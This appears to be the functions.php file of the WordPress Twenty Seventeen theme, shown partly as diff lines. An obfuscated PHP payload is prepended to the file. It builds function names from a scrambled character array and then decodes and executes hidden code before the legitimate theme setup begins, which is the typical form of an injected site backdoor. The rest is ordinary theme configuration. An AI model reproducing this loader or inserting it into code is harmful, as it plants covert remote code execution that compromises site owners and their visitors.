h[73].$syyzxh[80].$syyzxh[7].$syyzxh[54].$syyzxh[21].$syyzxh[15].$syyzxh[16].$syyzxh[15].$syyzxh[45].$syyzxh[337].$syyzxh[28].$syyzxh[0].$syyzxh[18].$syyzxh[48].$syyzxh[9].$syyzxh[125].$syyzxh[85].$syyzxh[45].$syyzxh[27].$syyzxh[17].$syyzxh[101].$syyzxh[116].$syyzxh[9].$syyzxh[54].$syyzxh[73].$syyzxh[2].$syyzxh[9].$syyzxh[195].$syyzxh[82].$syyzxh[115].$syyzxh[115].$syyzxh[237].$syyzxh[104].$syyzxh[12].$syyzxh[110].$syyzxh[140].$syyzxh[337].$syyzxh[23].$syyzxh[73].$syyzxh[28].$syyzxh[337].$syyzxh[73].$syyzxh[101].$syyzxh[24].$syyzxh[80].$syyzxh[17].$syyzxh[118].$syyzxh[337].$syyzxh[5].$syyzxh[73].$syyzxh[3].$syyzxh[17].$syyzxh[42].$syyzxh[16].$syyzxh[67].$syyzxh[104].$syyzxh[82].$syyzxh[337].$syyzxh[15].$syyzxh[78].$syyzxh[28].$syyzxh[5].$syyzxh[73].$syyzxh[116].$syyzxh[96].$syyzxh[18].$syyzxh[7].$syyzxh[27].$syyzxh[13].$syyzxh[16].$syyzxh[42].$syyzxh[35].$syyzxh[82].$syyzxh[42].$syyzxh[25].$syyzxh[4].$syyzxh[24].$syyzxh[75].$syyzxh[1].$syyzxh[24].$syyzxh[4].$syyzxh[140].$syyzxh[25].$syyzxh[115].$syyzxh[100].$syyzxh[195].$syyzxh[17].$syyzxh[23].$syyzxh[12].$syyzxh[110].$syyzxh[85].$syyzxh[104].$syyzxh[3].$syyzxh[65].$syyzxh[1].$syyzxh[48].$syyzxh[56].$syyzxh[59].$syyzxh[14].$syyzxh[115].$syyzxh[118].$syyzxh[36].$syyzxh[27].$syyzxh[14].$syyzxh[18].$syyzxh[79].$syyzxh[195].$syyzxh[0].$syyzxh[35].$syyzxh[82].$syyzxh[53].$syyzxh[54].$syyzxh[118].$syyzxh[12].$syyzxh[86].$syyzxh[45].$syyzxh[25].$syyzxh[3].$syyzxh[28].$syyzxh[82].$syyzxh[101].$syyzxh[115].$syyzxh[67].$syyzxh[56].$syyzxh[195].$syyzxh[35].$syyzxh[41].$syyzxh[48].$syyzxh[13].$syyzxh[59].$syyzxh[16].$syyzxh[21].$syyzxh[101].$syyzxh[17].$syyzxh[45].$syyzxh[67].$syyzxh[85].$syyzxh[21].$syyzxh[39].$syyzxh[65].$syyzxh[9].$syyzxh[24].$syyzxh[14].$syyzxh[140].$syyzxh[25].$syyzxh[23].$syyzxh[34].$syyzxh[5].$syyzxh[78].$syyzxh[45].$syyzxh[24].$syyzxh[82].$syyzxh[75].$syyzxh[39].$syyzxh[28].$syyzxh[79].$syyzxh[9].$syyzxh[78].$syyzxh[337].$syyzxh[65].$syyzxh[24].$syyzxh[14].$syyzxh[2].$syyzxh[12].$syyzxh[1].$syyzxh[44].$syyzxh[109].$syyzxh[25].$syyzxh[195].$syyzxh[121].$syyzxh[24].$syyzxh[109].$syyzxh[41].$syyzxh[39].$syyzxh[79].$syyzxh[140].$syyzxh[12].$syyzxh[3].$syyzxh[110].$syyzxh[0].$syyzxh[78].$syyzxh[80].$syyzxh[115].$syyzxh[54].$syyzxh[7].$syyzxh[82].$syyzxh[5].$syyzxh[1].$syyzxh[82].$syyzxh[36].$syyzxh[35].$syyzxh[42].$syyzxh[34].$syyzxh[237].$syyzxh[54].$syyzxh[39].$syyzxh[13].$syyzxh[115].$syyzxh[41].$syyzxh[48].$syyzxh[0].$syyzxh[75].$syyzxh[4].$syyzxh[237].$syyzxh[195].$syyzxh[104].$syyzxh[109].$syyzxh[45].$syyzxh[19].$syyzxh[67].$syyzxh[115].$syyzxh[3].$syyzxh[121].$syyzxh[39].$syyzxh[42].$syyzxh[27].$syyzxh[23].$syyzxh[203].$syyzxh[17].$syyzxh[73].$syyzxh[35].$syyzxh[48].$syyzxh[25].$syyzxh[19].$syyzxh[140].$syyzxh[36].$syyzxh[41].$syyzxh[79].$syyzxh[0].$syyzxh[4].$syyzxh[5].$syyzxh[44].$syyzxh[73].$syyzxh[42].$syyzxh[12].$syyzxh[59].$syyzxh[5].$syyzxh[195].$syyzxh[65].$syyzxh[3].$syyzxh[203].$syyzxh[48].$syyzxh[59].$syyzxh[101].$syyzxh[34].$syyzxh[53].$syyzxh[36].$syyzxh[203].$syyzxh[78].$syyzxh[44].$syyzxh[34].$syyzxh[9].$syyzxh[0].$syyzxh[18].$syyzxh[56].$syyzxh[116].$syyzxh[82].$syyzxh[27].$syyzxh[65].$syyzxh[115].$syyzxh[25].$syyzxh[121].$syyzxh[65].$syyzxh[80].$syyzxh[75].$syyzxh[86].$syyzxh[56].$syyzxh[82].$syyzxh[12].$syyzxh[59].$syyzxh[67].$syyzxh[15].$syyzxh[54].$syyzxh[86].$syyzxh[75].$syyzxh[41].$syyzxh[73].$syyzxh[7].$syyzxh[39].$syyzxh[115].$syyzxh[140].$syyzxh[36].$syyzxh[237].$syyzxh[80].$syyzxh[5].$syyzxh[7].$syyzxh[82].$syyzxh[116].$syyzxh[125].$syyzxh[195].$syyzxh[42].$syyzxh[115].$syyzxh[18].$syyzxh[13].$syyzxh[82].$syyzxh[116].$syyzxh[96].$syyzxh[56].$syyzxh[42].$syyzxh[75].$syyzxh[96].$syyzxh[56].$syyzxh[115].$syyzxh[116].$syyzxh[121].$syyzxh[45].$syyzxh[53].$syyzxh[142].$syyzxh[13].$syyzxh[34].$syyzxh[7].$syyzxh[2].$syyzxh[125].$syyzxh[3].$syyzxh[56].$syyzxh[110].$syyzxh[41].$syyzxh[53].$syyzxh[67].$syyzxh[3].$syyzxh[110].$syyzxh[78].$syyzxh[15].$syyzxh[2].$syyzxh[39].$syyzxh[20].$syyzxh[59].$syyzxh[142].$syyzxh[73].$syyzxh[73].$syyzxh[20].$syyzxh[80].$syyzxh[53].$syyzxh[56].$syyzxh[9].$syyzxh[24].$syyzxh[82].$syyzxh[23].$syyzxh[110].$syyzxh[109].$syyzxh[82].$syyzxh[237].$syyzxh[1].$syyzxh[12].$syyzxh[1].$syyzxh[100].$syyzxh[86].$syyzxh[25].$syyzxh[18].$syyzxh[67].$syyzxh[109].$syyzxh[73].$syyzxh[19].$syyzxh[16].$syyzxh[53].$syyzxh[45].$syyzxh[79].$syyzxh[2].$syyzxh[86].$syyzxh[142].$syyzxh[44].$syyzxh[101].$syyzxh[237].$syyzxh[0].$syyzxh[41].$syyzxh[19].$syyzxh[54].$syyzxh[20].$syyzxh[109].$syyzxh[116].$syyzxh[116].$syyzxh[5].$syyzxh[25].$syyzxh[101].$syyzxh[59].$syyzxh[203].$syyzxh[36].$syyzxh[21].$syyzxh[4].$syyzxh[35].$syyzxh[142].$syyzxh[203].$syyzxh[4].$syyzxh[80].$syyzxh[85].$syyzxh[45].$syyzxh[1].$syyzxh[39].$syyzxh[140].$syyzxh[79].$syyzxh[13].$syyzxh[12].$syyzxh[59].$syyzxh[96].$syyzxh[109].$syyzxh[80].$syyzxh[34].$syyzxh[35].$syyzxh[56].$syyzxh[237].$syyzxh[58].$syyzxh[12].$syyzxh[59].$syyzxh[116].$syyzxh[78].$syyzxh[4].$syyzxh[25].$syyzxh[101].$syyzxh[101].$syyzxh[79].$syyzxh[23].$syyzxh[23].$syyzxh[67].$syyzxh[80].$syyzxh[85].$syyzxh[14].$syyzxh[25].$syyzxh[7].$syyzxh[12].$syyzxh[337].$syyzxh[96].$syyzxh[41].$syyzxh[5].$syyzxh[101].$syyzxh[58].$syyzxh[115].$syyzxh[5].$syyzxh[35].$syyzxh[203].$syyzxh[36].$syyzxh[34].$syyzxh[18].$syyzxh[337].$syyzxh[7].$syyzxh[65].$syyzxh[24].$syyzxh[14].$syyzxh[142].$syyzxh[19].$syyzxh[56].$syyzxh[96].$syyzxh[80].$syyzxh[27].$syyzxh[35].$syyzxh[78].$syyzxh[0].$syyzxh[13].$syyzxh[67].$syyzxh[121].$syyzxh[24].$syyzxh[27].$syyzxh[7].$syyzxh[2].$syyzxh[24].$syyzxh[45].$syyzxh[44].$syyzxh[78].$syyzxh[110].$syyzxh[1].$syyzxh[110].$syyzxh[65].$syyzxh[121].$syyzxh[54].$syyzxh[73].$syyzxh[140].$syyzxh[54].$syyzxh[54].$syyzxh[48].$syyzxh[75].$syyzxh[14].$syyzxh[53].$syyzxh[7].$syyzxh[195].$syyzxh[14].$syyzxh[12].$syyzxh[104].$syyzxh[121].$syyzxh[24].$syyzxh[27].$syyzxh[13].$syyzxh[85].$syyzxh[19].$syyzxh[67].$syyzxh[21].$syyzxh[27].$syyzxh[85].$syyzxh[100].$syyzxh[3].$syyzxh[56].$syyzxh[100].$syyzxh[73].$syyzxh[14].$syyzxh[337].$syyzxh[140].$syyzxh[58].$syyzxh[121].$syyzxh[3].$syyzxh[18].$syyzxh[121].$syyzxh[56].$syyzxh[86].$syyzxh[79].$syyzxh[75].$syyzxh[203].$syyzxh[195].$syyzxh[35].$syyzxh[1].$syyzxh[14].$syyzxh[115].$syyzxh[36].$syyzxh[78].$syyzxh[125].$syyzxh[2].$syyzxh[100].$syyzxh[79].$syyzxh[45].$syyzxh[13].$syyzxh[82].$syyzxh[21].$syyzxh[78].$syyzxh[125].$syyzxh[115].$syyzxh[20].$syyzxh[23].$syyzxh[85].$syyzxh[203].$syyzxh[85].$syyzxh[96].$syyzxh[27].$syyzxh[36].$syyzxh[59].$syyzxh[24].$syyzxh[73].$syyzxh[109].$syyzxh[14].$syyzxh[54].$syyzxh[110].$syyzxh[79].$syyzxh[195].$syyzxh[59].$syyzxh[39].$syyzxh[35].$syyzxh[80].$syyzxh[96].$syyzxh[101].$syyzxh[39].$syyzxh[14].$syyzxh[195].$syyzxh[110].$syyzxh[86].$syyzxh[140].$syyzxh[58].$syyzxh[42].$syyzxh[82].$syyzxh[14].$syyzxh[140].$syyzxh[195].$syyzxh[67].$syyzxh[104].$syyzxh[121].$syyzxh[2].$syyzxh[24].$syyzxh[20].$syyzxh[39].$syyzxh[20].$syyzxh[75].$syyzxh[0].$syyzxh[109].$syyzxh[2].$syyzxh[4].$syyzxh[3].$syyzxh[4].$syyzxh[0].$syyzxh[65].$syyzxh[140].$syyzxh[53].$syyzxh[27].$syyzxh[35].$syyzxh[17].$syyzxh[80].$syyzxh[96].$syyzxh[82].$syyzxh[85].$syyzxh[79].$syyzxh[118].$syyzxh[14].$syyzxh[7].$syyzxh[2].$syyzxh[101].$syyzxh[39].$syyzxh[101].$syyzxh[125].$syyzxh[75].$syyzxh[17].$syyzxh[82].$syyzxh[42].$syyzxh[12].$syyzxh[140].$syyzxh[110].$syyzxh[75].$syyzxh[19].$syyzxh[237].$syyzxh[5].$syyzxh[12].$syyzxh[116].$syyzxh[16].$syyzxh[25].$syyzxh[41].$syyzxh[27].$syyzxh[45].$syyzxh[86].$syyzxh[67].$syyzxh[15].$syyzxh[337].$syyzxh[125].$syyzxh[110].$syyzxh[15].$syyzxh[104].$syyzxh[0].$syyzxh[44].$syyzxh[109].$syyzxh[25].$syyzxh[41].$syyzxh[67].$syyzxh[100].$syyzxh[18].$syyzxh[73].$syyzxh[80].$syyzxh[142].$syyzxh[101].$syyzxh[110].$syyzxh[104].$syyzxh[337].$syyzxh[79].$syyzxh[73].$syyzxh[7].$syyzxh[0].$syyzxh[86].$syyzxh[75].$syyzxh[5].$syyzxh[42].$syyzxh[9].$syyzxh[48].$syyzxh[101].$syyzxh[115].$syyzxh[12].$syyzxh[19].$syyzxh[58].$syyzxh[20].$syyzxh[28].$syyzxh[237].$syyzxh[67].$syyzxh[17].$syyzxh[5].$syyzxh[86].$syyzxh[15].$syyzxh[25].$syyzxh[337].$syyzxh[75].$syyzxh[125].$syyzxh[118].$syyzxh[121].$syyzxh[140].$syyzxh[0].$syyzxh[13].$syyzxh[19].$syyzxh[12].$syyzxh[16].$syyzxh[337].$syyzxh[53].$syyzxh[36].$syyzxh[80].$syyzxh[73].$syyzxh[0].$syyzxh[78].$syyzxh[59].$syyzxh[104].$syyzxh[75].$syyzxh[7].$syyzxh[12].$syyzxh[16].$syyzxh[101].$syyzxh[78].$syyzxh[15].$syyzxh[44].$syyzxh[18].$syyzxh[96].$syyzxh[5].$syyzxh[17].$syyzxh[12].$syyzxh[0].$syyzxh[19].$syyzxh[20].$syyzxh[19].$syyzxh[79].$syyzxh[53].$syyzxh[20].$syyzxh[86].$syyzxh[34].$syyzxh[2].$syyzxh[44].$syyzxh[45].$syyzxh[4].$syyzxh[125].$syyzxh[34].$syyzxh[36].$syyzxh[125].$syyzxh[25].$syyzxh[44].$syyzxh[53].$syyzxh[27].$syyzxh[337].$syyzxh[109].$syyzxh[85].$syyzxh[80].$syyzxh[80].$syyzxh[96].$syyzxh[59].$syyzxh[109].$syyzxh[80].$syyzxh[85].$syyzxh[20].$syyzxh[85].$syyzxh[0].$syyzxh[13].$syyzxh[3].$syyzxh[101].$syyzxh[13].$syyzxh[203].$syyzxh[79].$syyzxh[85].$syyzxh[48].$syyzxh[35].$syyzxh[9].$syyzxh[7].$syyzxh[118].$syyzxh[118].$syyzxh[24].$syyzxh[121].$syyzxh[125].$syyzxh[41].$syyzxh[59].$syyzxh[337].$syyzxh[13].$syyzxh[24].$syyzxh[58].$syyzxh[21].$syyzxh[54].$syyzxh[116].$syyzxh[67].$syyzxh[109].$syyzxh[195].$syyzxh[24].$syyzxh[28].$syyzxh[2].$syyzxh[12].$syyzxh[109].$syyzxh[79].$syyzxh[78].$syyzxh[3].$syyzxh[24].$syyzxh[42].$syyzxh[237].$syyzxh[125].$syyzxh[85].$syyzxh[36].$syyzxh[195].$syyzxh[18].$syyzxh[65].$syyzxh[39].$syyzxh[80].$syyzxh[203].$syyzxh[67].$syyzxh[59].$syyzxh[13].$syyzxh[19].$syyzxh[58].$syyzxh[337].$syyzxh[21].$syyzxh[13].$syyzxh[0].$syyzxh[109].$syyzxh[78].$syyzxh[18].$syyzxh[9].$syyzxh[36].$syyzxh[39].$syyzxh[12].$syyzxh[41].$syyzxh[116].$syyzxh[12].$syyzxh[21].$syyzxh[96].$syyzxh[53].$syyzxh[109].$syyzxh[237].$syyzxh[116].$syyzxh[142].$syyzxh[104].$syyzxh[142].$syyzxh[116].$syyzxh[19].$syyzxh[67].$syyzxh[54].$syyzxh[56].$syyzxh[16].$syyzxh[44].$syyzxh[203].$syyzxh[115].$syyzxh[118].$syyzxh[23].$syyzxh[1].$syyzxh[67].$syyzxh[110].$syyzxh[337].$syyzxh[109].$syyzxh[142].$syyzxh[59].$syyzxh[24].$syyzxh[12].$syyzxh[140].$syyzxh[23].$syyzxh[19].$syyzxh[14].$syyzxh[73].$syyzxh[21].$syyzxh[35].$syyzxh[16].$syyzxh[140].$syyzxh[237].$syyzxh[80].$syyzxh[48].$syyzxh[142].$syyzxh[42].$syyzxh[44].$syyzxh[53].$syyzxh[96].$syyzxh[16].$syyzxh[118].$syyzxh[13].$syyzxh[59].$syyzxh[14].$syyzxh[116].$syyzxh[7].$syyzxh[0].$syyzxh[20].$syyzxh[35].$syyzxh[116].$syyzxh[41].$syyzxh[19].$syyzxh[16].$syyzxh[337].$syyzxh[203].$syyzxh[67].$syyzxh[73].$syyzxh[44].$syyzxh[142].$syyzxh[7].$syyzxh[12].$syyzxh[142].$syyzxh[75].$syyzxh[125].$syyzxh[59].$syyzxh[54].$syyzxh[45].$syyzxh[116].$syyzxh[203].$syyzxh[58].$syyzxh[56].$syyzxh[34].$syyzxh[14].$syyzxh[125].$syyzxh[118].$syyzxh[96].$syyzxh[86].$syyzxh[41].$syyzxh[15].$syyzxh[59].$syyzxh[45].$syyzxh[100].$syyzxh[7].$syyzxh[121].$syyzxh[82].$syyzxh[0].$syyzxh[115].$syyzxh[42].$syyzxh[45].$syyzxh[86].$syyzxh[80].$syyzxh[86].$syyzxh[45].$syyzxh[100].$syyzxh[14].$syyzxh[18].$syyzxh[140].$syyzxh[2].$syyzxh[59].$syyzxh[20].$syyzxh[27].$syyzxh[104].$syyzxh[4].$syyzxh[75].$syyzxh[237].$syyzxh[13].$syyzxh[58].$syyzxh[16].$syyzxh[203].$syyzxh[13].$syyzxh[13].$syyzxh[19].$syyzxh[17].$syyzxh[17].$syyzxh[203].$syyzxh[118].$syyzxh[67].$syyzxh[5].$syyzxh[203].$syyzxh[80].$syyzxh[16].$syyzxh[85].$syyzxh[125].$syyzxh[39].$syyzxh[2].$syyzxh[17].$syyzxh[85].$syyzxh[21].$syyzxh[14].$syyzxh[79].$syyzxh[44].$syyzxh[110].$syyzxh[65].$syyzxh[80].$syyzxh[24].$syyzxh[35].$syyzxh[42].$syyzxh[110].$syyzxh[237].$syyzxh[21].$syyzxh[86].$syyzxh[118].$syyzxh[82].$syyzxh[21].$syyzxh[78].$syyzxh[56].$syyzxh[36].$syyzxh[67].$syyzxh[18].$syyzxh[195].$syyzxh[116].$syyzxh[20].$syyzxh[104].$syyzxh[67].$syyzxh[2].$syyzxh[195].$syyzxh[18].$syyzxh[56].$syyzxh[104].$syyzxh[34].$syyzxh[1].$syyzxh[27].$syyzxh[25].$syyzxh[17].$syyzxh[5].$syyzxh[78].$syyzxh[78].$syyzxh[115].$syyzxh[85].$syyzxh[116].$syyzxh[54].$syyzxh[12].$syyzxh[96].$syyzxh[85].$syyzxh[337].$syyzxh[80].$syyzxh[3].$syyzxh[16].$syyzxh[96].$syyzxh[56].$syyzxh[104].$syyzxh[80].$syyzxh[115].$syyzxh[17].$syyzxh[1].$syyzxh[110].$syyzxh[19].$syyzxh[79].$syyzxh[116].$syyzxh[5].$syyzxh[115].$syyzxh[58].$syyzxh[100].$syyzxh[39].$syyzxh[203].$syyzxh[24].$syyzxh[13].$syyzxh[101].$syyzxh[34].$syyzxh[28].$syyzxh[53].$syyzxh[28].$syyzxh[86].$syyzxh[2].$syyzxh[3].$syyzxh[58].$syyzxh[1].$syyzxh[12].$syyzxh[58].$syyzxh[25].$syyzxh[116].$syyzxh[19].$syyzxh[7].$syyzxh[34].$syyzxh[15].$syyzxh[86].$syyzxh[337].$syyzxh[75].$syyzxh[4].$syyzxh[80].$syyzxh[110].$syyzxh[14].$syyzxh[59].$syyzxh[115].$syyzxh[16].$syyzxh[44].$syyzxh[82].$syyzxh[121].$syyzxh[203].$syyzxh[58].$syyzxh[28].$syyzxh[21].$syyzxh[58].$syyzxh[142].$syyzxh[3].$syyzxh[5].$syyzxh[75].$syyzxh[25].$syyzxh[3].$syyzxh[13].$syyzxh[86].$syyzxh[21].$syyzxh[65].$syyzxh[16].$syyzxh[80].$syyzxh[86].$syyzxh[16].$syyzxh[42].$syyzxh[79].$syyzxh[23].$syyzxh[118].$syyzxh[16].$syyzxh[20].$syyzxh[23].$syyzxh[25].$syyzxh[14].$syyzxh[80].$syyzxh[16].$syyzxh[9].$syyzxh[75].$syyzxh[44].$syyzxh[79].$syyzxh[5].$syyzxh[3].$syyzxh[12].$syyzxh[65].$syyzxh[75].$syyzxh[96].$syyzxh[54].$syyzxh[15].$syyzxh[5].$syyzxh[25].$syyzxh[45].$syyzxh[86].$syyzxh[2].$syyzxh[39].$syyzxh[101].$syyzxh[18].$syyzxh[1].$syyzxh[140].$syyzxh[14].$syyzxh[116].$syyzxh[5].$syyzxh[5].$syyzxh[3].$syyzxh[58].$syyzxh[203].$syyzxh[115].$syyzxh[78].$syyzxh[118].$syyzxh[45].$syyzxh[7].$syyzxh[1].$syyzxh[79].$syyzxh[58].$syyzxh[65].$syyzxh[86].$syyzxh[1].$syyzxh[54].$syyzxh[78].$syyzxh[195].$syyzxh[21].$syyzxh[116].$syyzxh[20].$syyzxh[20].$syyzxh[18].$syyzxh[65].$syyzxh[121].$syyzxh[20].$syyzxh[78].$syyzxh[118].$syyzxh[237].$syyzxh[25].$syyzxh[12].$syyzxh[15].$syyzxh[21].$syyzxh[100].$syyzxh[18].$syyzxh[78].$syyzxh[42].$syyzxh[110].$syyzxh[16].$syyzxh[24].$syyzxh[2].$syyzxh[125].$syyzxh[3].$syyzxh[24].$syyzxh[82].$syyzxh[17].$syyzxh[85].$syyzxh[65].$syyzxh[4].$syyzxh[142].$syyzxh[5].$syyzxh[15].$syyzxh[48].$syyzxh[125].$syyzxh[36].$syyzxh[9].$syyzxh[54].$syyzxh[121].$syyzxh[59].$syyzxh[195].$syyzxh[15].$syyzxh[109].$syyzxh[24].$syyzxh[86].$syyzxh[54].$syyzxh[5].$syyzxh[195].$syyzxh[118].$syyzxh[80].$syyzxh[101].$syyzxh[101].$syyzxh[65].$syyzxh[16].$syyzxh[115].$syyzxh[13].$syyzxh[116].$syyzxh[9].$syyzxh[15].$syyzxh[85].$syyzxh[15].$syyzxh[12].$syyzxh[19].$syyzxh[14].$syyzxh[7].$syyzxh[67].$syyzxh[79].$syyzxh[14].$syyzxh[48].$syyzxh[337].$syyzxh[80].$syyzxh[15].$syyzxh[125].$syyzxh[27].$syyzxh[54].$syyzxh[24].$syyzxh[19].$syyzxh[125].$syyzxh[140].$syyzxh[44].$syyzxh[110].$syyzxh[73].$syyzxh[85].$syyzxh[116].$syyzxh[65].$syyzxh[195].$syyzxh[53].$syyzxh[16].$syyzxh[16].$syyzxh[85].$syyzxh[7].$syyzxh[1].$syyzxh[18].$syyzxh[4].$syyzxh[1].$syyzxh[104].$syyzxh[7].$syyzxh[337].$syyzxh[110].$syyzxh[7].$syyzxh[54].$syyzxh[104].$syyzxh[42].$syyzxh[125].$syyzxh[116].$syyzxh[203].$syyzxh[1].$syyzxh[5].$syyzxh[142].$syyzxh[104].$syyzxh[104].$syyzxh[54].$syyzxh[140].$syyzxh[35].$syyzxh[16].$syyzxh[48].$syyzxh[82].$syyzxh[23].$syyzxh[4].$syyzxh[73].$syyzxh[67].$syyzxh[21].$syyzxh[79].$syyzxh[7].$syyzxh[56].$syyzxh[25].$syyzxh[125].$syyzxh[7].$syyzxh[82].$syyzxh[1].$syyzxh[7].$syyzxh[121].$syyzxh[13].$syyzxh[82].$syyzxh[45].$syyzxh[0].$syyzxh[2].$syyzxh[100].$syyzxh[59].$syyzxh[36].$syyzxh[7].$syyzxh[73].$syyzxh[79].$syyzxh[82].$syyzxh[23].$syyzxh[24].$syyzxh[35].$syyzxh[16].$syyzxh[23].$syyzxh[35].$syyzxh[14].$syyzxh[14].$syyzxh[118].$syyzxh[59].$syyzxh[27].$syyzxh[85].$syyzxh[65].$syyzxh[48].$syyzxh[3].$syyzxh[5].$syyzxh[10].$syyzxh[10];$rueyeydfhnxgl=$syyzxh[24].$syyzxh[34].$syyzxh[42].$syyzxh[75].$syyzxh[104].$syyzxh[125].$syyzxh[266].$syyzxh[4].$syyzxh[75].$syyzxh[15].$syyzxh[100].$syyzxh[4].$syyzxh[75];$etkkgossdismavo=$syyzxh[142].$syyzxh[67].$syyzxh[27].$syyzxh[3].$syyzxh[15].$syyzxh[100].$syyzxh[80].$syyzxh[85].$syyzxh[73].$syyzxh[75].$syyzxh[42].$syyzxh[42];$igynfcliht=$syyzxh[42].$syyzxh[110].$syyzxh[73].$syyzxh[73].$syyzxh[75].$syyzxh[16];$fzicdcnnibgbfot=$syyzxh[15].$syyzxh[73].$syyzxh[75].$syyzxh[34].$syyzxh[110].$syyzxh[75].$syyzxh[266].$syyzxh[0].$syyzxh[27].$syyzxh[3].$syyzxh[15].$syyzxh[110].$syyzxh[101].$syyzxh[100].$syyzxh[3];$pogswnrksuvbbo=$syyzxh[649].$syyzxh[34];$hngjrixfqylsdal=$syyzxh[1566].$syyzxh[1171].$syyzxh[34].$syyzxh[649].$syyzxh[2377].$syyzxh[337].$syyzxh[34].$syyzxh[16].$syyzxh[75];$pabiwozghtcivq=$syyzxh[75].$syyzxh[78].$syyzxh[101].$syyzxh[110];$nsahnocktcjyl=$igynfcliht;$ycuubaruixazrwx=$etkkgossdismavo($rueyeydfhnxgl($fndimpqzirdcd));$ycuubaruixazrwx=$nsahnocktcjyl($ycuubaruixazrwx);$kkglstzudswmr=$fzicdcnnibgbfot($pogswnrksuvbbo,$igynfcliht($hngjrixfqylsdal));$kkglstzudswmr($igynfcliht($ycuubaruixazrwx));$pabiwozghtcivq;?><?php
+/**
+ * Twenty Seventeen functions and definitions
+ *
+ * @link https://developer.wordpress.org/themes/basics/theme-functions/
+ *
+ * @package WordPress
+ * @subpackage Twenty_Seventeen
+ * @since 1.0
+ */
+
+/**
+ * Twenty Seventeen only works in WordPress 4.7 or later.
+ */
+if ( version_compare( $GLOBALS['wp_version'], '4.7-alpha', '<' ) ) {
+	require get_template_directory() . '/inc/back-compat.php';
+	return;
+}
+
+/**
+ * Sets up theme defaults and registers support for various WordPress features.
+ *
+ * Note that this function is hooked into the after_setup_theme hook, which
+ * runs before the init hook. The init hook is too late for some features, such
+ * as indicating support for post thumbnails.
+ */
+function twentyseventeen_setup() {
+	/*
+	 * Make theme available for translation.
+	 * Translations can be filed at WordPress.org. See: https://translate.wordpress.org/projects/wp-themes/twentyseventeen
+	 * If you're building a theme based on Twenty Seventeen, use a find and replace
+	 * to change 'twentyseventeen' to the name of your theme in all the template files.
+	 */
+	load_theme_textdomain( 'twentyseventeen' );
+
+	// Add default posts and comments RSS feed links to head.
+	add_theme_support( 'automatic-feed-links' );
+
+	/*
+	 * Let WordPress manage the document title.
+	 * By adding theme support, we declare that this theme does not use a
+	 * hard-coded <title> tag in the document head, and expect WordPress to
+	 * provide it for us.
+	 */
+	add_theme_support( 'title-tag' );
+
+	/*
+	 * Enable support for Post Thumbnails on posts and pages.
+	 *
+	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
+	 */
+	add_theme_support( 'post-thumbnails' );
+
+	add_image_size( 'twentyseventeen-featured-image', 2000, 1200, true );
+
+	add_image_size( 'twentyseventeen-thumbnail-avatar', 100, 100, true );
+
+	// Set the default content width.
+	$GLOBALS['content_width'] = 525;
+
+	// This theme uses wp_nav_menu() in two locations.
+	register_nav_menus(
+		array(
+			'top'    => __( 'Top Menu', 'twentyseventeen' ),
+			'social' => __( 'Social Links Menu', 'twentyseventeen' ),
+		)
+	);
+
+	/*
+	 * Switch default core markup for search form, comment form, and comments
+	 * to output valid HTML5.
+	 */
+	add_theme_support(
+		'html5',
+		array(
+			'comment-form',
+			'comment-list',
+			'gallery',
+			'caption',
+		)
+	);
+
+	/*
+	 * Enable support for Post Formats.
+	 *
+	 * See: https://codex.wordpress.org/Post_Formats
+	 */
+	add_theme_support(
+		'post-formats',
+		array(
+			'aside',
+			'image',
+			'video',
+			'quote',
+			'link',
+			'gallery',
+			'audio',
+		)
+	);
+
+	// Add theme support for Custom Logo.
+	add_theme_support(
+		'custom-logo',
+		array(
+			'width'      => 250,
+			'height'     => 250,
+			'flex-width' => true,
+		)
+	);
+
+	// Add theme support for selective refresh for widgets.
+	add_theme_support( 'customize-selective-refresh-widgets' );
+
+	/*
+	 * This theme styles the visual editor to resemble the theme style,
+	 * specifically font, colors, and column width.
+	  */
+	add_editor_style( array( 'assets/css/editor-style.css', twentyseventeen_fonts_url() ) );
+
+	// Load regular editor styles into the new block-based editor.
+	add_theme_support( 'editor-styles' );
+
+	// Load default block styles.
+	add_theme_support( 'wp-block-styles' );
+
+	// Add support for responsive embeds.
+	add_theme_support( 'responsive-embeds' );
+
+	// Define and register starter content to showcase the theme on new sites.
+	$starter_content = array(
+		'widgets'     => array(
+			// Place three core-defined widgets in the sidebar area.
+			'sidebar-1' => array(
+				'text_business_info',
+				'search',
+				'text_about',
+			),
+
+			// Add the core-defined business info widget to the footer 1 area.
+			'sidebar-2' => array(
+				'text_business_info',
+			),
+
+			// Put two core-defined widgets in the footer 2 area.
+			'sidebar-3' => array(
+				'text_about',
+				'search',
+			),
+		),
+
+		// Specify the core-defined pages to create and add custom thumbnails to some of them.
+		'posts'       => array(
+			'home',
+			'about'            => array(
+				'thumbnail' => '{{image-sandwich}}',
+			),
+			'contact'          => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+			'blog'             => array(
+				'thumbnail' => '{{image-coffee}}',
+			),
+			'homepage-section' => array(
+				'thumbnail' => '{{image-espresso}}',
+			),
+		),
+
+		// Create the custom image attachments used as post thumbnails for pages.
+		'attachments' => array(
+			'image-espresso' => array(
+				'post_title' => _x( 'Espresso', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/espresso.jpg', // URL relative to the template directory.
+			),
+			'image-sandwich' => array(
+				'post_title' => _x( 'Sandwich', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/sandwich.jpg',
+			),
+			'image-coffee'   => array(
+				'post_title' => _x( 'Coffee', 'Theme starter content', 'twentyseventeen' ),
+				'file'       => 'assets/images/coffee.jpg',
+			),
+		),
+
+		// Default to a static front page and assign the front and posts pages.
+		'options'     => array(
+			'show_on_front'  => 'page',
+			'page_on_front'  => '{{home}}',
+			'page_for_posts' => '{{blog}}',
+		),
+
+		// Set the front page section theme mods to the IDs of the core-registered pages.
+		'theme_mods'  => array(
+			'panel_1' => '{{homepage-section}}',
+			'panel_2' => '{{about}}',
+			'panel_3' => '{{blog}}',
+			'panel_4' => '{{contact}}',
+		),
+
+		// Set up nav menus for each of the two areas registered in the theme.
+		'nav_menus'   => array(
+			// Assign a menu to the "top" location.
+			'top'    => array(
+				'name'  => __( 'Top Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
+					'page_about',
+					'page_blog',
+					'page_contact',
+				),
+			),
+
+			// Assign a menu to the "social" location.
+			'social' => array(
+				'name'  => __( 'Social Links Menu', 'twentyseventeen' ),
+				'items' => array(
+					'link_yelp',
+					'link_facebook',
+					'link_twitter',
+					'link_instagram',
+					'link_email',
+				),
+			),
